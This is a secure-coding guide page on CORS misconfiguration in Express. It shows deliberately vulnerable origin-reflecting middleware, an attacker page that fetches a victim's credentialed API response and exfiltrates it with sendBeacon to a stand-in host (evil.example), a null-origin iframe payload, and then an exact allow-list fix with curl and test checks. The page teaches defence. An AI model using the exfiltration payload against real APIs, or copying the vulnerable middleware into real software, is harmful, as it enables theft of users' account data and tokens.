---
title: CORS misconfiguration
description: What an attacker actually steals when CORS is wrong, the exact origin strings that defeat sloppy matching, and an allow-list config verified with curl.
status: current
updated: 2026-09-08
---

CORS does not add security — it *relaxes* the same-origin policy that normally stops one site from reading another's authenticated responses. A misconfiguration therefore hands a cross-origin attacker the ability to read data as the logged-in victim. This page is the exploit side; the library configuration reference lives at [CORS](../express-libraries/cors.md).

## The threat

The same-origin policy lets an attacker's page *send* a request to your API but not *read* the response. CORS response headers are what grant the read. If you reflect an untrusted `Origin` back in `Access-Control-Allow-Origin` and also send `Access-Control-Allow-Credentials: true`, then any site the victim visits can make credentialed `fetch` calls to your API and read the JSON — account data, tokens, anything the victim's cookies authorize. The victim does nothing but open a tab.

## A concrete exploit

Start with an API that reflects the request origin and allows credentials. This is the single most common CORS mistake, usually written to "make CORS just work."

:::danger Origin reflection with credentials
Reflecting `req.headers.origin` into `Access-Control-Allow-Origin` while sending `Access-Control-Allow-Credentials: true` allows *every* origin to read authenticated responses.
:::

```js vulnerable title="DO NOT COPY"
import express from 'express'

const app = express()

app.use((req, res, next) => {
  // Reflects whatever Origin the caller sent — i.e. trusts everyone.
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin ?? '*')
  res.setHeader('Access-Control-Allow-Credentials', 'true')
  res.setHeader('Vary', 'Origin') // at least present here; often forgotten
  next()
})

app.get('/api/me', (req, res) => {
  res.json({ email: 'victim@example.com', apiToken: 'sk_live_abc123' })
})

app.listen(3000)
```

The attacker hosts this page on `https://evil.example` and gets the victim to open it. Because `credentials: 'include'` sends the victim's cookies and the server reflects the origin, the browser lets the script read the response:

```html title="hosted on https://evil.example"
<script>
  fetch('https://api.example.com/api/me', { credentials: 'include' })
    .then((r) => r.json())
    .then((data) => {
      // Response body is readable cross-origin — exfiltrate it.
      navigator.sendBeacon('https://evil.example/steal', JSON.stringify(data))
    })
</script>
```

The victim's browser sends their session cookie to `api.example.com`, the server replies with `Access-Control-Allow-Origin: https://evil.example` and `Access-Control-Allow-Credentials: true`, and the script reads `{ "email": "...", "apiToken": "sk_live_abc123" }`. That is the whole attack.

### The variations that all reduce to "trusts too much"

- **The null-origin trap.** Sandboxed iframes, `data:` URLs and some redirects send `Origin: null`. Allow-lists that include `'null'` (or configs that treat a missing origin as allowed) can be hit from an attacker-controlled sandboxed iframe:

  ```html
  <iframe sandbox="allow-scripts" srcdoc="&lt;script&gt;fetch('https://api.example.com/api/me',{credentials:'include'})...&lt;/script&gt;"></iframe>
  ```

  The iframe's requests carry `Origin: null`. Never put `null` on the allow-list.

- **Sloppy suffix/prefix matching.** `origin.endsWith('example.com')` and `origin.startsWith('https://example.com')` both pass attacker origins. With `endsWith`, the attacker registers `evil-example.com`; with a naive prefix or substring check, `https://example.com.evil.net` passes:

  ```js vulnerable title="DO NOT COPY"
  // endsWith('example.com') is TRUE for both of these attacker origins:
  //   https://evil-example.com
  //   https://example.com.evil.net   (with a substring/prefix variant)
  if (origin.endsWith('example.com')) allow(origin)
  ```

- **Regex anchoring mistakes.** `/example\.com/` is unanchored and matches anywhere in the string, so `https://example.com.evil.net` and `https://evilexample.com` both pass. Even `/^https:\/\/example\.com/` (no end anchor) matches `https://example.com.evil.net`. A dot that is not escaped (`/example.com/`) also matches `exampleXcom`.

- **`*` with credentials is rejected by the browser, not a workaround.** `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true` is explicitly invalid — the browser refuses the response. Developers "fix" the resulting error by switching to origin reflection, which is worse. If you need credentials, you must echo one specific allowed origin.

- **Missing `Vary: Origin` poisons shared caches.** When you echo a per-request origin but omit `Vary: Origin`, a CDN or proxy caches the first response — including its `Access-Control-Allow-Origin` — and serves it to callers from other origins. A response allowing `https://app.example.com` gets served to a request from `https://evil.example`, or vice versa. Always send `Vary: Origin` whenever the ACAO header depends on the request origin.

:::note
Browsers are extending CORS-style checks to requests that cross from a public site into a private/local network (Private Network Access / Local Network Access). The exact enforcement is still rolling out and differs between Chrome and Edge builds, so treat it as an emerging control rather than something to depend on today. Do not design your allow-list around it.
:::

## The fix in code

Match the incoming origin against a **fixed allow-list** by exact string equality, echo back only a member of that list, and send `Vary: Origin`. Never reflect an arbitrary origin, never use suffix/substring tests, never include `null`.

```js good title="src/cors.js"
import express from 'express'

// Exact, fully-qualified origins. No suffix matching, no null.
const ALLOWED = new Set([
  'https://app.example.com',
  'https://admin.example.com',
])

export function cors(req, res, next) {
  const origin = req.headers.origin

  // Only echo an origin that is an exact member of the allow-list.
  if (origin && ALLOWED.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin)
    res.setHeader('Access-Control-Allow-Credentials', 'true')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
    res.setHeader('Access-Control-Max-Age', '600')
  }

  // Because ACAO varies with the request Origin, caches must key on it.
  res.setHeader('Vary', 'Origin')

  // Answer the preflight itself.
  if (req.method === 'OPTIONS') return res.sendStatus(204)
  next()
}
```

An origin not on the list gets no `Access-Control-Allow-Origin` header at all, so the browser blocks the cross-origin read — which is exactly the same-origin default you want. For most apps the [`cors`](../express-libraries/cors.md) package with an `origin` array does this for you; the hand-rolled version above shows what those options must produce.

:::best-practice
Keep the allow-list to exact origins you control, and prefer that credentialed cross-origin APIs use short-lived bearer tokens over ambient cookies. If the browser is not sending a cookie automatically, a mis-set CORS header leaks much less.
:::

## How to verify the fix

Send an `OPTIONS` preflight with each origin and read the headers. `curl -i` shows exactly what the browser will act on.

An **allowed** origin is echoed back:

```bash
curl -i -X OPTIONS https://api.example.com/api/me \
  -H 'Origin: https://app.example.com' \
  -H 'Access-Control-Request-Method: GET'
```

```text
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Vary: Origin
```

A **disallowed** origin gets no allow-origin header, so the browser blocks the read:

```bash
curl -i -X OPTIONS https://api.example.com/api/me \
  -H 'Origin: https://evil.example' \
  -H 'Access-Control-Request-Method: GET'
```

```text
HTTP/1.1 204 No Content
Vary: Origin
```

The absence of `Access-Control-Allow-Origin` in the second response is the pass condition. Also re-run against the old config's failure modes — `Origin: https://evil-example.com` and `Origin: null` must both come back with no allow-origin header.

```js title="test/cors.test.js"
import test from 'node:test'
import assert from 'node:assert/strict'
import request from 'supertest'
import { createApp } from '../src/app.js'

test('disallowed and look-alike origins are not echoed', async () => {
  const app = createApp()
  for (const origin of ['https://evil.example', 'https://evil-example.com', 'null']) {
    const res = await request(app)
      .options('/api/me')
      .set('Origin', origin)
      .set('Access-Control-Request-Method', 'GET')
    assert.equal(res.headers['access-control-allow-origin'], undefined)
  }
})

test('an allow-listed origin is echoed with credentials', async () => {
  const res = await request(createApp())
    .options('/api/me')
    .set('Origin', 'https://app.example.com')
    .set('Access-Control-Request-Method', 'GET')
  assert.equal(res.headers['access-control-allow-origin'], 'https://app.example.com')
  assert.equal(res.headers['access-control-allow-credentials'], 'true')
  assert.match(res.headers['vary'] ?? '', /Origin/)
})
```

## Common mistakes

- **Reflecting `req.headers.origin` with credentials on.** This trusts every site. Match against a fixed allow-list and echo only a member.
- **`endsWith`/`startsWith`/substring origin tests.** Beaten by `evil-example.com` and `example.com.evil.net`. Compare full origins with `===` or `Set.has`.
- **Unanchored or under-anchored regexes.** `/example\.com/` and `/^https:\/\/example\.com/` both match `example.com.evil.net`. Prefer an exact-string allow-list to a regex.
- **`Access-Control-Allow-Origin: *` with `credentials: true`.** The browser rejects it; do not "fix" it by reflecting the origin.
- **Omitting `Vary: Origin`** when the ACAO depends on the request origin. A shared cache then serves one origin's allow header to another.
- **Allow-listing `null`.** Sandboxed iframes send `Origin: null`; including it lets attacker iframes through.
- **Thinking CORS protects writes.** It governs cross-origin *reads*; it does not stop CSRF. See the CSRF page.

## Related topics

- [CORS](../express-libraries/cors.md) — configuring the `cors` package to produce the headers above.
- [CSRF](csrf.md) — why a permissive CORS policy is not what stops forged writes, and vice versa.
- [Security headers](security-headers.md) — the other response headers that constrain cross-origin behavior.
- [Authentication and session security](authentication-and-session-security.md) — cookie flags that reduce the damage of a CORS slip.
